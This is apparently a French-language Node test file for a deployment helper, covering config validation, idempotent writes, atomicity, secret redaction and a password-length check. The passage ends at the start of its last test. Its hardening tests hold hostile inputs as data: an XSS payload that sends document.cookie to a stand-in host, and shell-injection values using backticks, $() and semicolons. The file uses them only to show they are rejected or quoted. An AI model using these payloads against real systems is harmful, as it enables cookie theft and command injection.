// tests/next/deployer.test.mjs
//
// Déployeur (Point 6, docs/next/DEPLOYER_ASSISTANT_CONTRACT.md §4). Couvre la
// logique PURE de tools/deploy/piloteo-deploy.mjs (le chemin non-interactif) :
// choisir/valider → config normalisée (via `normalizeConfig`, réutilisé, pas
// dupliqué) → génération du contenu des fichiers → idempotence → rejets. Le
// prompt interactif n'est PAS testé ici (contrat), seule la logique importable
// l'est.
//
// Round de correction (contrariant, 2 failles réelles + 3 durcissements) :
// mot de passe faible accepté par deploy-vps.sh, fuite de secret Fly en CI
// (stdio:"inherit"), regex client-id trop permissive (</script> accepté),
// atomicité (--target invalide écrivait quand même des fichiers). Chaque
// correctif a son test « repro » ci-dessous.

import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm, readFile, writeFile, mkdir, copyFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";

import { normalizeConfig } from "../../src/config/runtime-config.js";
import {
  DeployerError,
  buildDeployConfig,
  isPlausibleGoogleClientId,
  renderRuntimeJson,
  renderConfigJs,
  writeDeployArtifacts,
  ensureHostedEnv,
  planHostedEnv,
  validatePrerequisites,
  resolveLaunchCommand,
  formatCommand,
  shQuote,
  runLaunchCommand,
  redactSecretLines,
  runNonInteractive,
  parseArgs,
  REPO_ROOT,
} from "../../tools/deploy/piloteo-deploy.mjs";

const REAL_GOOGLE_CLIENT_ID = "940162140944-llbfni295begfk20egmvnuqd9sc37cj8.apps.googleusercontent.com";

async function withTempDir(fn) {
  const dir = await mkdtemp(join(tmpdir(), "piloteo-deployer-"));
  try {
    await fn(dir);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

// ---------------------------------------------------------------------------
// Cas 1 — Local
// ---------------------------------------------------------------------------

test("cas 1 — Local : config {mode:local, storage:{provider:indexeddb}} via normalizeConfig", () => {
  const config = buildDeployConfig({ answer: "local" });
  assert.deepEqual(config, { mode: "local", storage: { provider: "indexeddb" } });
  // Égalité exacte avec normalizeConfig lui-même (aucune divergence de forme).
  assert.deepEqual(config, normalizeConfig({ mode: "local" }));

  // Chemin flags directs (--mode local), équivalent.
  const viaFlags = buildDeployConfig({ mode: "local" });
  assert.deepEqual(viaFlags, config);
});

// ---------------------------------------------------------------------------
// Cas 2 — Dossier partagé
// ---------------------------------------------------------------------------

test("cas 2 — Dossier partagé : config {mode:shared, storage:{provider:folder}}", () => {
  const config = buildDeployConfig({ answer: "folder" });
  assert.deepEqual(config, { mode: "shared", storage: { provider: "folder" } });
  assert.deepEqual(config, normalizeConfig({ mode: "shared", storage: { provider: "folder" } }));

  const viaFlags = buildDeployConfig({ mode: "shared", provider: "folder" });
  assert.deepEqual(viaFlags, config);
});

// ---------------------------------------------------------------------------
// Cas 3 — Google Drive avec / sans client id
// ---------------------------------------------------------------------------

test("cas 3 — Drive AVEC googleClientId : config conforme, googleWired=true", () => {
  const config = buildDeployConfig({ answer: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID });
  assert.deepEqual(config, {
    mode: "shared",
    storage: { provider: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID },
    googleWired: true,
  });
  assert.deepEqual(
    config,
    normalizeConfig({ mode: "shared", storage: { provider: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID } })
  );
});

test("cas 3 — Drive SANS googleClientId : échec de validation explicite (règle du déployeur)", () => {
  assert.throws(() => buildDeployConfig({ answer: "google-drive" }), DeployerError);
  assert.throws(() => buildDeployConfig({ answer: "google-drive" }), /GOOGLE_CLIENT_ID requis/);
  assert.throws(() => buildDeployConfig({ mode: "shared", provider: "google-drive", googleClientId: "" }), DeployerError);
  assert.throws(() => buildDeployConfig({ mode: "shared", provider: "google-drive", googleClientId: "abc" }), /forme plausible/);
});

test("isPlausibleGoogleClientId : forme attendue (numéro-de-projet-tiret-identifiant, jeu de caractères réel)", () => {
  assert.equal(isPlausibleGoogleClientId(REAL_GOOGLE_CLIENT_ID), true);
  assert.equal(isPlausibleGoogleClientId("123456789-abcXYZ_012.apps.googleusercontent.com"), true);
  // Forme générique sans préfixe "<chiffres>-" : rejetée (ce n'est PAS la forme réelle émise par Google).
  assert.equal(isPlausibleGoogleClientId("abc.apps.googleusercontent.com"), false);
  assert.equal(isPlausibleGoogleClientId("abc"), false);
  assert.equal(isPlausibleGoogleClientId(""), false);
  assert.equal(isPlausibleGoogleClientId(null), false);
  assert.equal(isPlausibleGoogleClientId(undefined), false);
});

test("DURCISSEMENT 3 (repro contrariant) — un client id avec métacaractères JS (</script>, guillemets, backtick…) est désormais REFUSÉ", () => {
  const payloads = [
    `x";fetch("http://evil.test/steal?c="+document.cookie);//.apps.googleusercontent.com`,
    `x\\";window.PWNED=1;//.apps.googleusercontent.com`,
    // La charge qui cassait un futur inlining <script>...</script> (hors scope, mais interdit par construction) :
    `x</script><script>window.PWNED=1</script>x.apps.googleusercontent.com`,
    "x`+String(window.PWNED=1)+`.apps.googleusercontent.com",
    `x window.PWNED=1; .apps.googleusercontent.com`,
  ];
  for (const p of payloads) {
    assert.equal(isPlausibleGoogleClientId(p), false, `payload accepté à tort : ${p}`);
    // buildDeployConfig doit rejeter AVANT d'atteindre normalizeConfig/renderConfigJs.
    assert.throws(() => buildDeployConfig({ mode: "shared", provider: "google-drive", googleClientId: p }), DeployerError);
  }
  // Un client id de forme réelle contenant malgré tout un "</script" littéral
  // (impossible en pratique vu le format Google, mais on le vérifie explicitement)
  // ne pourrait de toute façon jamais apparaître dans le JS généré : le portail
  // d'entrée ne laisse passer que [0-9]+-[0-9a-zA-Z_]+, un jeu de caractères qui
  // ne contient ni "<", ni "/", ni guillemet, ni backtick.
  assert.doesNotMatch(REAL_GOOGLE_CLIENT_ID, /[<>"'`;]/);
});

// ---------------------------------------------------------------------------
// Cas 4 — Hébergé
// ---------------------------------------------------------------------------

test("cas 4 — Hébergé : config {mode:hosted, endpoint} conforme au contrat", () => {
  const config = buildDeployConfig({ answer: "hosted", endpoint: "https://piloteo.example.fr" });
  assert.deepEqual(config, { mode: "hosted", endpoint: "https://piloteo.example.fr" });
  assert.deepEqual(config, normalizeConfig({ mode: "hosted", endpoint: "https://piloteo.example.fr" }));
});

test("cas 4 — Hébergé sans endpoint : rejet (via normalizeConfig)", () => {
  assert.throws(() => buildDeployConfig({ mode: "hosted" }), DeployerError);
  assert.throws(() => buildDeployConfig({ mode: "hosted" }), /endpoint/);
});

// ---------------------------------------------------------------------------
// Cas 5 — deploy/piloteo.config.js : contenu + idempotence + aucun secret
// ---------------------------------------------------------------------------

test("cas 5 — piloteo.config.js (Drive) : window.PILOTEO_GOOGLE_CLIENT_ID + PILOTEO_MODE, aucun secret", () => {
  const config = buildDeployConfig({ answer: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID });
  const js = renderConfigJs(config);
  assert.match(js, /window\.PILOTEO_MODE = "shared";/);
  assert.match(js, new RegExp(`window\\.PILOTEO_GOOGLE_CLIENT_ID = "${REAL_GOOGLE_CLIENT_ID.replace(/\./g, "\\.")}";`));
  // Aucun secret : ni client_secret, ni token, ni mot de passe.
  assert.doesNotMatch(js, /client_secret/i);
  assert.doesNotMatch(js, /password|mot de passe/i);
  assert.doesNotMatch(js, /token/i);
});

test("cas 5 — piloteo.config.js : idempotent (deux générations → contenu identique)", () => {
  const config = buildDeployConfig({ answer: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID });
  const first = renderConfigJs(config);
  const second = renderConfigJs(config);
  assert.equal(first, second);

  const jsonFirst = renderRuntimeJson(config);
  const jsonSecond = renderRuntimeJson(config);
  assert.equal(jsonFirst, jsonSecond);
});

test("cas 5 — piloteo.config.js (Local/Dossier) : PILOTEO_MODE seul, pas de PILOTEO_GOOGLE_CLIENT_ID", () => {
  const local = renderConfigJs(buildDeployConfig({ answer: "local" }));
  assert.match(local, /window\.PILOTEO_MODE = "local";/);
  assert.doesNotMatch(local, /PILOTEO_GOOGLE_CLIENT_ID/);

  const folder = renderConfigJs(buildDeployConfig({ answer: "folder" }));
  assert.match(folder, /window\.PILOTEO_MODE = "shared";/);
  assert.doesNotMatch(folder, /PILOTEO_GOOGLE_CLIENT_ID/);
});

test("cas 5 — écriture réelle sur disque (tmpdir) : deux écritures successives produisent des fichiers identiques", async () => {
  await withTempDir(async (dir) => {
    const config = buildDeployConfig({ answer: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID });
    const first = writeDeployArtifacts(config, { deployDir: dir });
    const contentJsFirst = await readFile(first.configJsPath, "utf8");
    const contentJsonFirst = await readFile(first.runtimeJsonPath, "utf8");

    const second = writeDeployArtifacts(config, { deployDir: dir });
    const contentJsSecond = await readFile(second.configJsPath, "utf8");
    const contentJsonSecond = await readFile(second.runtimeJsonPath, "utf8");

    assert.equal(contentJsFirst, contentJsSecond);
    assert.equal(contentJsonFirst, contentJsonSecond);
    assert.equal(JSON.parse(contentJsonFirst).storage.googleClientId, REAL_GOOGLE_CLIENT_ID);
  });
});

// ---------------------------------------------------------------------------
// Cas 6 — Config invalide → rejet via normalizeConfig, message clair, RIEN écrit
// ---------------------------------------------------------------------------

test("cas 6 — mode inconnu : rejet via normalizeConfig, message clair", () => {
  assert.throws(() => buildDeployConfig({ mode: "bogus" }), DeployerError);
  assert.throws(() => buildDeployConfig({ mode: "bogus" }), /mode invalide/);
});

test("cas 6 — provider incohérent (mode shared) : rejet via normalizeConfig, message clair", () => {
  assert.throws(() => buildDeployConfig({ mode: "shared", provider: "s3" }), DeployerError);
  assert.throws(() => buildDeployConfig({ mode: "shared", provider: "s3" }), /storage\.provider/);
});

test("cas 6 — config invalide : AUCUN fichier écrit (runNonInteractive échoue avant toute E/S)", async () => {
  await withTempDir(async (dir) => {
    assert.throws(() => runNonInteractive({ mode: "bogus" }, { deployDir: dir }), DeployerError);
    assert.equal(existsSync(join(dir, "piloteo.runtime.json")), false);
    assert.equal(existsSync(join(dir, "piloteo.config.js")), false);

    assert.throws(() => runNonInteractive({ mode: "shared", provider: "s3" }, { deployDir: dir }), DeployerError);
    assert.equal(existsSync(join(dir, "piloteo.runtime.json")), false);

    assert.throws(() => runNonInteractive({ mode: "shared", provider: "google-drive" }, { deployDir: dir }), DeployerError);
    assert.equal(existsSync(join(dir, "piloteo.runtime.json")), false);

    assert.throws(() => runNonInteractive({ mode: "hosted" }, { deployDir: dir }), DeployerError);
    assert.equal(existsSync(join(dir, "piloteo.runtime.json")), false);
  });
});

test("DURCISSEMENT 4 (repro contrariant) — mode hosted + --target invalide : AUCUN fichier écrit (atomicité)", async () => {
  await withTempDir(async (deployDir) => {
    await withTempDir(async (rootDir) => {
      await writeFile(join(rootDir, ".env.example"), "PILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n");

      let threw = null;
      try {
        runNonInteractive({ mode: "hosted", endpoint: "https://x.example", target: "azure-bogus" }, { deployDir, rootDir });
      } catch (err) {
        threw = err;
      }
      assert.ok(threw instanceof DeployerError, "runNonInteractive doit lever avant toute écriture");
      assert.match(threw.message, /Cible de lancement inconnue/);
      // Avant le correctif, resolveLaunchCommand() n'était appelé qu'APRÈS
      // writeDeployArtifacts()/ensureHostedEnv() : les 3 fichiers existaient
      // malgré l'erreur finale. Ils ne doivent maintenant PLUS exister.
      assert.equal(existsSync(join(deployDir, "piloteo.runtime.json")), false);
      assert.equal(existsSync(join(deployDir, "piloteo.config.js")), false);
      assert.equal(existsSync(join(rootDir, ".env")), false);
    });
  });
});

test("DURCISSEMENT 4 — mode hosted + target fly, paramètres --client/--org-name/--admin-id incomplets : AUCUN fichier écrit non plus", async () => {
  await withTempDir(async (deployDir) => {
    await withTempDir(async (rootDir) => {
      await writeFile(join(rootDir, ".env.example"), "PILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n");
      assert.throws(
        () => runNonInteractive({ mode: "hosted", endpoint: "https://x.example", target: "fly" }, { deployDir, rootDir }),
        DeployerError
      );
      assert.equal(existsSync(join(deployDir, "piloteo.runtime.json")), false);
      assert.equal(existsSync(join(deployDir, "piloteo.config.js")), false);
      assert.equal(existsSync(join(rootDir, ".env")), false);
    });
  });
});

test("planHostedEnv : ne touche jamais le disque (lecture seule) — même verdict qu'ensureHostedEnv sans effet de bord", async () => {
  await withTempDir(async (rootDir) => {
    assert.throws(() => planHostedEnv({ rootDir }), DeployerError);
    assert.equal(existsSync(join(rootDir, ".env")), false); // aucune écriture, même en cas d'échec futur

    await writeFile(join(rootDir, ".env.example"), "PILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n");
    const plan = planHostedEnv({ rootDir });
    assert.equal(plan.needsCopy, true);
    assert.equal(existsSync(join(rootDir, ".env")), false); // toujours pas écrit : planHostedEnv ne fait QUE planifier
  });
});

// ---------------------------------------------------------------------------
// Compléments : runNonInteractive de bout en bout (écrit réellement, tmpdir),
// prérequis, résolution de la commande de lancement (dry-run), parseArgs.
// ---------------------------------------------------------------------------

test("runNonInteractive : Local — écrit les 2 artefacts, aucun .env, aucun lancement", async () => {
  await withTempDir(async (dir) => {
    const result = runNonInteractive({ mode: "local" }, { deployDir: dir, rootDir: REPO_ROOT });
    assert.equal(existsSync(result.runtimeJsonPath), true);
    assert.equal(existsSync(result.configJsPath), true);
    assert.equal(result.env, undefined);
    assert.equal(result.launchCommand, undefined);
    assert.deepEqual(JSON.parse(await readFile(result.runtimeJsonPath, "utf8")), { mode: "local", storage: { provider: "indexeddb" } });
  });
});

test("runNonInteractive : Hébergé sans .env préexistant — le crée depuis .env.example, placeholders intacts, aucun secret inventé", async () => {
  await withTempDir(async (deployDir) => {
    await withTempDir(async (rootDir) => {
      // .env.example minimal, réaliste (mêmes placeholders que le vrai fichier).
      await writeFile(
        join(rootDir, ".env.example"),
        "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n"
      );
      const result = runNonInteractive(
        { mode: "hosted", endpoint: "https://piloteo.example.fr" },
        { deployDir, rootDir }
      );
      assert.equal(result.env.created, true);
      const envContent = await readFile(result.env.path, "utf8");
      assert.match(envContent, /REMPLACER-PAR-UN-MOT-DE-PASSE-LONG/);
      assert.doesNotMatch(envContent, /^PILOTEO_ADMIN_PASSWORD=(?!REMPLACER-PAR-).+$/m);

      // Idempotent : un second appel ne réécrase pas un .env déjà édité par l'utilisateur.
      await writeFile(join(rootDir, ".env"), "PILOTEO_ADMIN_PASSWORD=un-vrai-mot-de-passe-edite\n");
      const second = runNonInteractive({ mode: "hosted", endpoint: "https://piloteo.example.fr" }, { deployDir, rootDir });
      assert.equal(second.env.created, false);
      const preserved = await readFile(second.env.path, "utf8");
      assert.match(preserved, /un-vrai-mot-de-passe-edite/);
    });
  });
});

test("ensureHostedEnv : échoue proprement si .env.example est absent (sans rien inventer)", async () => {
  await withTempDir(async (rootDir) => {
    assert.throws(() => ensureHostedEnv({ rootDir }), DeployerError);
    assert.equal(existsSync(join(rootDir, ".env")), false);
  });
});

test("validatePrerequisites : Hébergé sans docker => rejet dur ; avec docker mais sans fly (cible fly) => rejet dur", () => {
  const config = buildDeployConfig({ mode: "hosted", endpoint: "https://x.example" });
  assert.throws(() => validatePrerequisites(config, { checkCommand: () => false }), /Docker introuvable/);
  assert.throws(
    () => validatePrerequisites(config, { target: "fly", checkCommand: (cmd) => cmd === "docker" }),
    /flyctl introuvable/
  );
  const ok = validatePrerequisites(config, { target: "vps", checkCommand: () => true });
  assert.equal(ok.ok, true);
});

test("validatePrerequisites : Local ne prérequiert rien ; Dossier/Drive renvoient des avertissements informatifs", () => {
  assert.deepEqual(validatePrerequisites(buildDeployConfig({ mode: "local" })).warnings, []);
  const folderWarnings = validatePrerequisites(buildDeployConfig({ mode: "shared", provider: "folder" })).warnings;
  assert.ok(folderWarnings.some((w) => /Chromium/.test(w)));
  const driveWarnings = validatePrerequisites(
    buildDeployConfig({ mode: "shared", provider: "google-drive", googleClientId: REAL_GOOGLE_CLIENT_ID })
  ).warnings;
  assert.ok(driveWarnings.some((w) => /OAuth/.test(w)));
});

test("resolveLaunchCommand : null hors mode hosted ; fly/vps orchestrent les scripts EXISTANTS", () => {
  assert.equal(resolveLaunchCommand(buildDeployConfig({ mode: "local" }), { target: "vps" }), null);

  const hosted = buildDeployConfig({ mode: "hosted", endpoint: "https://x.example" });
  const vps = resolveLaunchCommand(hosted, { target: "vps" });
  assert.equal(vps.cmd, "scripts/deploy-vps.sh");
  assert.deepEqual(vps.args, []);
  assert.equal(formatCommand(vps), "scripts/deploy-vps.sh");
  // VPS n'imprime jamais de secret : sortie EN DIRECT (redact explicitement à false).
  assert.equal(vps.redact, false);

  assert.throws(() => resolveLaunchCommand(hosted, { target: "fly" }), /--client, --org-name et --admin-id/);

  const fly = resolveLaunchCommand(hosted, { target: "fly", client: "dupont", orgName: "Cabinet Dupont", adminId: "ADM" });
  assert.equal(fly.cmd, "scripts/fly-new-client.sh");
  assert.deepEqual(fly.args, ["dupont", "Cabinet Dupont", "ADM"]);
  // formatCommand guillemette SYSTÉMATIQUEMENT (guillemets simples), pas
  // seulement en présence d'un espace — voir DURCISSEMENT (round 2) plus bas.
  assert.equal(formatCommand(fly), "scripts/fly-new-client.sh 'dupont' 'Cabinet Dupont' 'ADM'");
  // Fly affiche le mot de passe admin généré une fois : sortie doit être rédigée.
  assert.equal(fly.redact, true);

  assert.throws(() => resolveLaunchCommand(hosted, { target: "azure" }), /Cible de lancement inconnue/);
});

test("DURCISSEMENT round 2 (repro contrariant) — formatCommand : injection shell via la ligne dry-run copiée-collée", () => {
  const hosted = buildDeployConfig({ mode: "hosted", endpoint: "https://x.example" });

  // Les 3 métacaractères explicitement visés par le contrariant : backtick,
  // $(), point-virgule — plus guillemet simple, espace, guillemet double pour
  // faire bonne mesure. shQuote (guillemets simples systématiques) doit TOUS
  // les neutraliser : à l'intérieur de '...', RIEN n'est interprété par un
  // shell POSIX sauf le guillemet simple lui-même.
  const payloads = [
    "Cabinet `touch /tmp/PWNED_p6r2_test`",
    "Cabinet $(touch /tmp/PWNED_p6r2_test)",
    "dupont;touch /tmp/PWNED_p6r2_test;echo ",
    "d'Artagnan", // guillemet simple interne — le cas qui exerce vraiment l'échappement '\''
    "Cabinet Dupont", // espace simple, cas déjà couvert avant round 2
    'Cabinet "Dupont"', // guillemets doubles internes
  ];

  for (const payload of payloads) {
    const launch = resolveLaunchCommand(hosted, {
      target: "fly",
      client: "dupont",
      orgName: payload,
      adminId: "ADM",
    });
    const printed = formatCommand(launch);

    // 1) L'argument imprimé est TOUJOURS entre guillemets simples.
    assert.match(printed, /'.*'/, `pas de guillemets simples pour : ${payload}`);

    // 2) Reproduit EXACTEMENT le repro du contrariant : remplace le script
    //    cible par un `echo` inoffensif et évalue la ligne imprimée dans un
    //    VRAI `sh -c` — si un métacaractère (backtick/$()/;) s'exécutait, il
    //    produirait un effet de bord observable (fichier créé) ou une sortie
    //    différente du texte attendu tel quel.
    const marker = "/tmp/PWNED_p6r2_test";
    const shellLine = printed.replace("scripts/fly-new-client.sh", "echo LAUNCH");
    const res = spawnSync("sh", ["-c", shellLine], { encoding: "utf8" });
    assert.equal(existsSync(marker), false, `métacaractère exécuté pour payload : ${payload}`);
    // La sortie doit contenir l'argv EXACT (le payload complet, métacaractères
    // inclus tels quels, jamais interprétés) — preuve que le shell a bien reçu
    // UN SEUL argv contenant le texte littéral, pas du code évalué.
    assert.match(res.stdout, /LAUNCH/);
    assert.match(res.stdout, new RegExp(payload.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  }
});

test("DURCISSEMENT round 2 — shQuote : ronde-trip via un VRAI shell pour un lot de métacaractères (parité argv)", () => {
  const dangerous = [
    "simple",
    "avec espace",
    "avec;point-virgule",
    "avec`backtick`",
    "avec$(sous-shell)",
    "avec'quote'simple",
    'avec"quote"double',
    "avec\\backslash",
    "avec&&et||ou",
    "avec|pipe",
    "avec>redirection<",
    "",
  ];
  for (const raw of dangerous) {
    const quoted = shQuote(raw);
    // Embarque `quoted` comme TEXTE dans une ligne shell (exactement comme un
    // opérateur qui coperait-collerait la ligne dry-run), puis fait parser
    // cette ligne par un VRAI sh (`set --`) et relit le token résultant — la
    // preuve d'un round-trip texte→argv fidèle, pas un simple passage d'argv
    // Node (qui ne traverse aucun parseur shell et ne prouverait rien ici).
    const script = `set -- ${quoted}; printf '%s' "$1"`;
    const res = spawnSync("sh", ["-c", script], { encoding: "utf8" });
    assert.equal(res.status, 0, `sh a échoué sur : ${JSON.stringify(quoted)} (stderr: ${res.stderr})`);
    assert.equal(res.stdout, raw, `round-trip cassé pour : ${JSON.stringify(raw)} => quoted=${quoted}`);
  }
});

test("DURCISSEMENT 2 (repro contrariant) — redactSecretLines masque toute ligne évoquant un secret, laisse le reste intact", () => {
  const text = [
    "== Secrets ==",
    "  Client        : dupont",
    "  URL           : https://piloteo-dupont.fly.dev",
    "  Admin         : admin",
    "  Mot de passe  : Xk9$aB2!qWzR8vLp",
    "  PILOTEO_ADMIN_PASSWORD=Xk9$aB2!qWzR8vLp",
    "  (à transmettre au client par un canal sûr)",
  ].join("\n");
  const redacted = redactSecretLines(text);
  assert.doesNotMatch(redacted, /Xk9\$aB2!qWzR8vLp/);
  assert.match(redacted, /Client\s+: dupont/); // les lignes non secrètes restent lisibles
  assert.match(redacted, /URL\s+: https:\/\/piloteo-dupont\.fly\.dev/);
  assert.match(redacted, /\[secret masqué/);
});

test("DURCISSEMENT 2 (repro contrariant) — runLaunchCommand(redact:true) ne laisse fuiter AUCUN secret sur stdout, même via un script réel", async () => {
  await withTempDir(async (dir) => {
    const secret = "ADMIN_PASSWORD_SUPER_SECRET_9f8e7d6c";
    const mockScript = join(dir, "fake-fly-new-client.sh");
    await writeFile(mockScript, `#!/bin/sh\necho "== Secrets =="\necho "Mot de passe  : ${secret}"\n`);
    spawnSync("chmod", ["+x", mockScript]);

    // Reproduit EXACTEMENT le repro du contrariant : invoque runLaunchCommand
    // dans un process enfant Node pour observer ce qui atteint le stdout du
    // "parent" (= ce que capturerait un job CI lançant piloteo-deploy.mjs).
    const runnerPath = join(dir, "runner.mjs");
    await writeFile(
      runnerPath,
      `import { runLaunchCommand } from ${JSON.stringify(join(REPO_ROOT, "tools/deploy/piloteo-deploy.mjs"))};\n` +
        `runLaunchCommand({ cmd: ${JSON.stringify(mockScript)}, args: [], cwd: ${JSON.stringify(dir)}, redact: true });\n`
    );
    const res = spawnSync(process.execPath, [runnerPath], { encoding: "utf8" });
    assert.doesNotMatch(res.stdout, new RegExp(secret));
    assert.match(res.stdout, /\[secret masqué/);

    // Sûr PAR DÉFAUT : ne pas préciser `redact` doit se comporter comme `redact:true`
    // (un appelant qui oublierait de le préciser ne doit PAS fuiter le secret).
    const runnerDefaultPath = join(dir, "runner-default.mjs");
    await writeFile(
      runnerDefaultPath,
      `import { runLaunchCommand } from ${JSON.stringify(join(REPO_ROOT, "tools/deploy/piloteo-deploy.mjs"))};\n` +
        `runLaunchCommand({ cmd: ${JSON.stringify(mockScript)}, args: [], cwd: ${JSON.stringify(dir)} });\n`
    );
    const resDefault = spawnSync(process.execPath, [runnerDefaultPath], { encoding: "utf8" });
    assert.doesNotMatch(resDefault.stdout, new RegExp(secret));
  });
});

test("runLaunchCommand(redact:false) — comportement EN DIRECT préservé (cible VPS, aucun secret à masquer)", async () => {
  await withTempDir(async (dir) => {
    const marker = "PILOTEO_VPS_MARKER_no_secret_here";
    const mockScript = join(dir, "fake-deploy-vps.sh");
    await writeFile(mockScript, `#!/bin/sh\necho "${marker}"\n`);
    spawnSync("chmod", ["+x", mockScript]);
    // redact:false => stdio:"inherit" (pas de capture) : on vérifie juste que
    // l'appel réussit et renvoie un status 0, sans lever.
    const result = runLaunchCommand({ cmd: mockScript, args: [], cwd: dir, redact: false });
    assert.equal(result.status, 0);
  });
});

test("runNonInteractive : Hébergé + target sans --deploy => dry-run (rien exécuté), commande imprimable", async () => {
  await withTempDir(async (deployDir) => {
    await withTempDir(async (rootDir) => {
      await writeFile(join(rootDir, ".env.example"), "PILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n");
      const result = runNonInteractive(
        { mode: "hosted", endpoint: "https://x.example", target: "vps", deploy: false },
        { deployDir, rootDir }
      );
      assert.equal(result.executed, false);
      assert.equal(result.launchCommand, "scripts/deploy-vps.sh");
    });
  });
});

test("parseArgs : flags explicites + repli sur les variables d'environnement plates (PILOTEO_MODE, etc.)", () => {
  const viaFlags = parseArgs(["--mode", "shared", "--provider", "google-drive", "--google-client-id", "abc.apps.googleusercontent.com", "--yes"], {});
  assert.equal(viaFlags.mode, "shared");
  assert.equal(viaFlags.provider, "google-drive");
  assert.equal(viaFlags.googleClientId, "abc.apps.googleusercontent.com");
  assert.equal(viaFlags.yes, true);
  assert.equal(viaFlags.deploy, false);

  const viaEnv = parseArgs([], { PILOTEO_MODE: "hosted", PILOTEO_ENDPOINT: "https://h.example" });
  assert.equal(viaEnv.mode, "hosted");
  assert.equal(viaEnv.endpoint, "https://h.example");

  // Un flag explicite prime sur l'environnement.
  const override = parseArgs(["--mode", "local"], { PILOTEO_MODE: "hosted" });
  assert.equal(override.mode, "local");

  assert.throws(() => parseArgs(["--bogus"]), DeployerError);
  assert.throws(() => parseArgs(["--mode"]), /valeur manquante/);
});

// ---------------------------------------------------------------------------
// DURCISSEMENT 1 (repro contrariant) — scripts/deploy-vps.sh : le garde-fou
// grep "REMPLACER-PAR-" ne vérifiait que la disparition du placeholder
// LITTÉRAL, pas la longueur du mot de passe. Exécute le VRAI script (docker/
// curl mockés sur PATH, comme le repro du contrariant) avec un mot de passe
// admin d'un seul caractère, puis avec un mot de passe conforme (>=12).
// ---------------------------------------------------------------------------

async function setupMockVpsRepo(work, { envContent }) {
  await mkdir(join(work, "scripts"), { recursive: true });
  await mkdir(join(work, "bin"), { recursive: true });
  await copyFile(join(REPO_ROOT, "scripts/deploy-vps.sh"), join(work, "scripts/deploy-vps.sh"));
  spawnSync("chmod", ["+x", join(work, "scripts/deploy-vps.sh")]);

  await writeFile(
    join(work, ".env.example"),
    "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n"
  );
  await writeFile(join(work, ".env"), envContent);

  // Mocks docker/curl (on ne veut PAS de vrai docker compose dans les tests).
  const dockerMock = join(work, "bin/docker");
  await writeFile(
    dockerMock,
    `#!/bin/sh\nif [ "$1" = "compose" ]; then\n  case "$2" in\n    version) exit 0 ;;\n    up) exit 0 ;;\n  esac\nfi\nexit 0\n`
  );
  spawnSync("chmod", ["+x", dockerMock]);

  const curlMock = join(work, "bin/curl");
  await writeFile(curlMock, `#!/bin/sh\nexit 0\n`);
  spawnSync("chmod", ["+x", curlMock]);
}

function runMockVpsScript(work) {
  return spawnSync("sh", ["scripts/deploy-vps.sh"], {
    cwd: work,
    env: { ...process.env, PATH: `${join(work, "bin")}:${process.env.PATH}` },
    encoding: "utf8",
  });
}

test("DURCISSEMENT 1 (repro contrariant) — deploy-vps.sh REFUSE un PILOTEO_ADMIN_PASSWORD d'1 caractère (pas seulement le placeholder disparu)", async () => {
  await withTempDir(async (work) => {
    await setupMockVpsRepo(work, { envContent: "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD=1\n" });
    const res = runMockVpsScript(work);
    assert.notEqual(res.status, 0, "deploy-vps.sh ne doit PAS réussir avec un mot de passe d'1 caractère");
    assert.match(res.stderr + res.stdout, /12 caractères minimum/);
  });
});

test("DURCISSEMENT 1 — deploy-vps.sh REFUSE aussi un PILOTEO_ADMIN_PASSWORD vide", async () => {
  await withTempDir(async (work) => {
    await setupMockVpsRepo(work, { envContent: "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD=\n" });
    const res = runMockVpsScript(work);
    assert.notEqual(res.status, 0);
  });
});

test("DURCISSEMENT 1 — deploy-vps.sh continue de refuser le placeholder littéral non édité", async () => {
  await withTempDir(async (work) => {
    await setupMockVpsRepo(work, {
      envContent: "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD=REMPLACER-PAR-UN-MOT-DE-PASSE-LONG\n",
    });
    const res = runMockVpsScript(work);
    assert.notEqual(res.status, 0);
  });
});

test("DURCISSEMENT 1 — deploy-vps.sh DÉMARRE avec un mot de passe conforme (>=12 caractères, non placeholder)", async () => {
  await withTempDir(async (work) => {
    await setupMockVpsRepo(work, {
      envContent: "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD=un-mot-de-passe-suffisamment-long\n",
    });
    const res = runMockVpsScript(work);
    assert.equal(res.status, 0, `deploy-vps.sh aurait dû réussir : stderr=${res.stderr}`);
  });
});

// ---------------------------------------------------------------------------
// DURCISSEMENT round 2 (repro contrariant, diagnostic) — la garde de longueur
// mesurait la valeur .env AVEC ses guillemets entourants (docker compose les
// retire, lui, avant de fixer la variable réelle du conteneur) : un mot de
// passe RÉEL de 10 caractères écrit entre guillemets ("1234567890") mesurait
// 12 et passait à tort la garde bash — server.py finissait par le rejeter,
// mais avec un message « timeout healthcheck » trompeur au lieu du vrai
// diagnostic. Corrigé : la garde retire désormais un couple de guillemets
// (simples OU doubles) entourant toute la valeur avant de mesurer.
// ---------------------------------------------------------------------------

test("DURCISSEMENT round 2 (repro contrariant) — deploy-vps.sh REFUSE un mot de passe RÉELLEMENT court même écrit ENTRE GUILLEMETS DOUBLES, avec le bon message", async () => {
